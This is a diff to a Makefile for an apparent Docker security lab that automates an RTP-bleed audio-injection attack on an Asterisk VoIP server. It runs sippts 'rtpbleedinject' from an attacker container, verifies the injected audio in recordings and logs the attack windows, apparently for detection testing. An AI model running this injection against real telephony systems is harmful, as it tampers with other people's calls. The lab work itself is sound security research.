@@ -1,10 +1,23 @@
-DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker compose")
 STACK_ID := 4_rtp_bleed_injection_asterisk
-CHECK_AVAILABLE_TAG := RTC_CHECK_AVAILABLE
 DRY_RUN_TAG := RTC_DRY_RUN
+SCENARIO ?= 4
+ATTACK_TYPE := rtp_injection
+EXPECTED_SIDS := 2000004
+DISABLE_SHARED_LIFECYCLE_TARGETS := 1
+include ../shared.mk
 
 SERVICE ?=
-ASTERISK_IP ?= 10.10.0.5
+NET_PREFIX ?= 10.10.$(INSTANCE_INDEX)
+LAB_SUBNET ?= $(NET_PREFIX).0/24
+ASTERISK_IP ?= $(NET_PREFIX).5
+SIPPTS_IP ?= $(NET_PREFIX).20
+BARESIP_7001_IP ?= $(NET_PREFIX).41
+BARESIP_7002_IP ?= $(NET_PREFIX).42
+SIP_HOST_PORT ?= $(if $(filter 0,$(INSTANCE_INDEX)),5060,1506$(INSTANCE_INDEX))
+RTP_HOST_RANGE ?= $(if $(filter 0,$(INSTANCE_INDEX)),10000-10099,11$(INSTANCE_INDEX)00-11$(INSTANCE_INDEX)99)
+ASTERISK_HTTP_PORT ?= $(if $(filter 0,$(INSTANCE_INDEX)),3003,30$(INSTANCE_INDEX)3)
+ASTERISK_ALT_HTTP_PORT ?= $(if $(filter 0,$(INSTANCE_INDEX)),3004,30$(INSTANCE_INDEX)4)
+RECORDINGS_DIR ?= $(if $(filter default,$(INSTANCE)),./recordings,./recordings/$(INSTANCE))
 INJECT_REF ?= audio_inject.wav
 VERIFY_NCC_THRESHOLD ?= 0.22
 VERIFY_NCC_MARGIN ?= 0.12
@@ -13,59 +26,66 @@ REPEAT_DELAY_SEC ?= 2
 REPEAT_LOG ?= /tmp/lab4-rtp-repeat.log
 REPEAT_MIN_SUCCESS ?= $(REPEAT_RUNS)
 
+export LAB_SUBNET ASTERISK_IP SIPPTS_IP BARESIP_7001_IP BARESIP_7002_IP SIP_HOST_PORT RTP_HOST_RANGE ASTERISK_HTTP_PORT ASTERISK_ALT_HTTP_PORT RECORDINGS_DIR
+
 run:
-	@$(DOCKER_COMPOSE) up -d --remove-orphans
+	@mkdir -p "$(RECORDINGS_DIR)/baresip-cli-7001" "$(RECORDINGS_DIR)/baresip-cli-7002"
+	@$(COMPOSE) up -d --remove-orphans
 
 start: run
 
 stop:
-	@$(DOCKER_COMPOSE) down --remove-orphans
+	@$(COMPOSE) down --remove-orphans
 
 start-wireshark:
-	@docker exec -it wireshark wireshark
+	# Previous implementation kept for traceability:
+	# @docker exec -it wireshark wireshark
+	# Change rationale: service-scoped exec targets the selected Compose project instance.
+	@$(COMPOSE) exec wireshark wireshark
 
 start-sippts:
-	@docker exec -it sippts bash
+	@$(COMPOSE) exec sippts bash
 
 start-cli-7001:
-	@docker exec -it linphone-cli-7001 sh
+	@$(COMPOSE) exec linphone-cli-7001 sh
 
 start-cli-7002:
-	@docker exec -it linphone-cli-7002 sh
+	@$(COMPOSE) exec linphone-cli-7002 sh
 
 cli-call:
-	@docker exec linphone-cli-7001 linphone-cli-send call sip:7002@$(ASTERISK_IP)
+	@$(COMPOSE) exec -T linphone-cli-7001 linphone-cli-send call sip:7002@$(ASTERISK_IP)
 
 cli-hangup:
-	@docker exec linphone-cli-7001 linphone-cli-send terminate
-	@docker exec linphone-cli-7002 linphone-cli-send terminate
+	@$(COMPOSE) exec -T linphone-cli-7001 linphone-cli-send terminate
+	@$(COMPOSE) exec -T linphone-cli-7002 linphone-cli-send terminate
 
 cli-status:
-	@docker exec linphone-cli-7001 linphone-cli-send calls
-	@docker exec linphone-cli-7002 linphone-cli-send calls
+	@$(COMPOSE) exec -T linphone-cli-7001 linphone-cli-send calls
+	@$(COMPOSE) exec -T linphone-cli-7002 linphone-cli-send calls
 
 start-baresip-7001:
-	@docker exec -it baresip-cli-7001 sh
+	@$(COMPOSE) exec baresip-cli-7001 sh
 
 start-baresip-7002:
-	@docker exec -it baresip-cli-7002 sh
+	@$(COMPOSE) exec baresip-cli-7002 sh
 
 baresip-call:
-	@docker exec baresip-cli-7001 baresip-cli-send /dial sip:7002@$(ASTERISK_IP)
+	@$(COMPOSE) exec -T baresip-cli-7001 baresip-cli-send /dial sip:7002@$(ASTERISK_IP)
 
 baresip-hangup:
-	@docker exec baresip-cli-7001 baresip-cli-send /hangup
-	@docker exec baresip-cli-7002 baresip-cli-send /hangup
+	@$(COMPOSE) exec -T baresip-cli-7001 baresip-cli-send /hangup
+	@$(COMPOSE) exec -T baresip-cli-7002 baresip-cli-send /hangup
 
 baresip-status:
-	@docker exec baresip-cli-7001 baresip-cli-send /listcalls
-	@docker exec baresip-cli-7002 baresip-cli-send /listcalls
+	@$(COMPOSE) exec -T baresip-cli-7001 baresip-cli-send /listcalls
+	@$(COMPOSE) exec -T baresip-cli-7002 baresip-cli-send /listcalls
 
 recordings-clean:
-	@find recordings -type f \( -name '*.wav' -o -name '*.png' -o -name '*.txt' \) -delete
+	@mkdir -p "$(RECORDINGS_DIR)"
+	@find "$(RECORDINGS_DIR)" -type f \( -name '*.wav' -o -name '*.png' -o -name '*.txt' \) -delete
 
 recordings-list:
-	@find recordings -type f | sort
+	@find "$(RECORDINGS_DIR)" -type f | sort
 
 recording-proof:
 	@./render-recording-proof.sh
@@ -75,45 +95,22 @@ recording-proof-file:
 	@./render-recording-proof.sh "$(FILE)"
 
 build:
-	@$(DOCKER_COMPOSE) build --no-cache $(SERVICE)
+	@$(COMPOSE) build --no-cache $(SERVICE)
 rebuild:
-	@$(DOCKER_COMPOSE) down --rmi all --remove-orphans || true
-	@$(DOCKER_COMPOSE) build --no-cache $(SERVICE)
-
-is-available:
-	@echo "$(CHECK_AVAILABLE_TAG)_BEGIN stack=$(STACK_ID)"
-	@$(DOCKER_COMPOSE) config -q
-	@SERVICES="$$( $(DOCKER_COMPOSE) config --services )"; \
-	if [ -z "$$SERVICES" ]; then \
-		echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) reason=no_services"; \
-		exit 1; \
-	fi; \
-	for SVC in $$SERVICES; do \
-		CID="$$( $(DOCKER_COMPOSE) ps -q $$SVC )"; \
-		if [ -z "$$CID" ]; then \
-			echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) service=$$SVC reason=not_running"; \
-			exit 1; \
-		fi; \
-		STATE="$$(docker inspect -f '{{.State.Status}}' $$CID)"; \
-		if [ "$$STATE" != "running" ]; then \
-			echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) service=$$SVC reason=unexpected_state state=$$STATE"; \
-			exit 1; \
-		fi; \
-		echo "$(CHECK_AVAILABLE_TAG)_OK stack=$(STACK_ID) service=$$SVC state=$$STATE"; \
-	done; \
-	echo "$(CHECK_AVAILABLE_TAG)_OK stack=$(STACK_ID) all_services=running"
+	@$(COMPOSE) down --rmi all --remove-orphans || true
+	@$(COMPOSE) build --no-cache $(SERVICE)
 
 dry-run:
 	@echo "$(DRY_RUN_TAG)_BEGIN stack=$(STACK_ID)"
-	@docker exec asterisk asterisk -rx "sip show settings" 2>/dev/null | grep -Eq 'Externaddr|Externhost' || { \
+	@$(COMPOSE) exec -T asterisk asterisk -rx "sip show settings" 2>/dev/null | grep -Eq 'Externaddr|Externhost' || { \
 		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=asterisk_sip_settings reason=missing_external_address"; \
 		exit 1; \
 	}
 	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=asterisk_sip_settings"
 	@i=0; \
 	while [ $$i -lt 20 ]; do \
-		PEER1="$$(docker exec asterisk asterisk -rx 'sip show peer 7001' 2>/dev/null || true)"; \
-		PEER2="$$(docker exec asterisk asterisk -rx 'sip show peer 7002' 2>/dev/null || true)"; \
+		PEER1="$$( $(COMPOSE) exec -T asterisk asterisk -rx 'sip show peer 7001' 2>/dev/null || true)"; \
+		PEER2="$$( $(COMPOSE) exec -T asterisk asterisk -rx 'sip show peer 7002' 2>/dev/null || true)"; \
 		if printf '%s\n' "$$PEER1" | grep -Eq 'Status.*OK' && printf '%s\n' "$$PEER2" | grep -Eq 'Status.*OK'; then \
 			echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=baresip_peers_registered"; \
 			break; \
@@ -125,19 +122,19 @@ dry-run:
 			exit 1; \
 		fi; \
 	done
-	@$(MAKE) --no-print-directory baresip-hangup >/dev/null 2>&1 || true
-	@$(MAKE) --no-print-directory baresip-call >/dev/null
+	@$(MAKE) baresip-hangup >/dev/null 2>&1 || true
+	@$(MAKE) baresip-call >/dev/null
 	@PORT=""; \
 	i=0; \
 	while [ $$i -lt 10 ]; do \
-		PORT="$$(SRC_IP=$(ASTERISK_IP) ./get-attack-cmd.sh --port-only 2>/dev/null || true)"; \
+		PORT="$$(WIRESHARK_CID="$$( $(COMPOSE) ps -q wireshark )" SRC_IP=$(ASTERISK_IP) ./get-attack-cmd.sh --port-only 2>/dev/null || true)"; \
 		if [ -n "$$PORT" ]; then \
 			break; \
 		fi; \
 		sleep 1; \
 		i=$$((i+1)); \
 	done; \
-	$(MAKE) --no-print-directory baresip-hangup >/dev/null 2>&1 || true; \
+	$(MAKE) baresip-hangup >/dev/null 2>&1 || true; \
 	if [ -z "$$PORT" ]; then \
 		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=rtp_port_detection reason=no_media_flow"; \
 		exit 1; \
@@ -152,30 +149,42 @@ build-analyzer:
 
 # Automatic verification command
 verify-injection: build-analyzer
-	@LATEST_WAV=$$(ls -1t recordings/*.wav | head -n 1); \
+	@LATEST_WAV=$$(ls -1t "$(RECORDINGS_DIR)"/*.wav | head -n 1); \
 	if [ -z "$$LATEST_WAV" ]; then echo "No recording found"; exit 1; fi; \
 	echo "[*] Analyzing: $$LATEST_WAV"; \
 	docker run --rm \
 		-e NCC_THRESHOLD=$(VERIFY_NCC_THRESHOLD) \
 		-e NCC_MARGIN=$(VERIFY_NCC_MARGIN) \
-		-v $$(pwd)/recordings:/recordings \
+		-v $$(pwd)/$(RECORDINGS_DIR):/recordings \
 		-v $$(pwd)/$(INJECT_REF):/references/audio_inject.wav:ro \
-		audio-analyzer /$$LATEST_WAV /references/audio_inject.wav
+		audio-analyzer /recordings/$$(basename "$$LATEST_WAV") /references/audio_inject.wav
 
 
 # Start the full scenario, launch the attack, then verify automatically
 auto-attack: stop recordings-clean build build-analyzer start
+	@$(RTC_EVENT) lab_ready stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) \
+		attacker_ip=$(SIPPTS_IP) victim_ip=$(ASTERISK_IP) \
+		expected_sids=$(EXPECTED_SIDS) attack_type=$(ATTACK_TYPE) \
+		probe_targets=$(SIPPTS_IP),$(ASTERISK_IP) probe_protocols=tcp,udp,icmp
 	@echo "[*] Waiting for SIP registration (5 seconds)..."
 	@sleep 5
+	@$(MAKE) attack
+	@$(RTC_EVENT) lab_stop stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE)
+
+attack:
 	@echo "[*] Starting Baresip call..."
 	@$(MAKE) baresip-call
 	@echo "[*] Detecting RTP destination port..."
-	@PORT=$$(SRC_IP=$(ASTERISK_IP) ./get-attack-cmd.sh --port-only); \
+	@PORT=$$(WIRESHARK_CID="$$( $(COMPOSE) ps -q wireshark )" SRC_IP=$(ASTERISK_IP) ./get-attack-cmd.sh --port-only); \
 	if [ -z "$$PORT" ]; then \
 		echo "[!] Failed: RTP port not found."; exit 1; \
 	fi; \
+	$(RTC_EVENT) attack_start stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE) attacker_ip=$(SIPPTS_IP) victim_ip=$(ASTERISK_IP); \
+	echo "$(ATTACK_WINDOW_TAG)_BEGIN ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE)"; \
 	echo "[+] Intercepted port: $$PORT. Launching injection..."; \
-	docker exec -it sippts sippts rtpbleedinject -i $(ASTERISK_IP) -r $$PORT -f /audio_inject.wav -p 0
+	$(COMPOSE) exec -T sippts sippts rtpbleedinject -i $(ASTERISK_IP) -r $$PORT -f /audio_inject.wav -p 0; \
+	$(RTC_EVENT) attack_end stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE); \
+	echo "$(ATTACK_WINDOW_TAG)_END ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=$(SCENARIO) instance=$(INSTANCE) attack=$(ATTACK_TYPE)"
 	@echo "[*] Waiting 3 seconds to ensure audio is written to recording..."
 	@sleep 3
 	@echo "[*] Hanging up Baresip call..."
@@ -192,7 +201,7 @@ repeat-check:
 	@PASS=0; FAIL=0; i=1; \
 	while [ $$i -le "$(REPEAT_RUNS)" ]; do \
 		echo "========== RUN $$i/$(REPEAT_RUNS) ==========" | tee -a "$(REPEAT_LOG)"; \
-		if $(MAKE) --no-print-directory auto-attack \
+		if $(MAKE) auto-attack \
 			ASTERISK_IP="$(ASTERISK_IP)" \
 			INJECT_REF="$(INJECT_REF)" \
 			VERIFY_NCC_THRESHOLD="$(VERIFY_NCC_THRESHOLD)" \
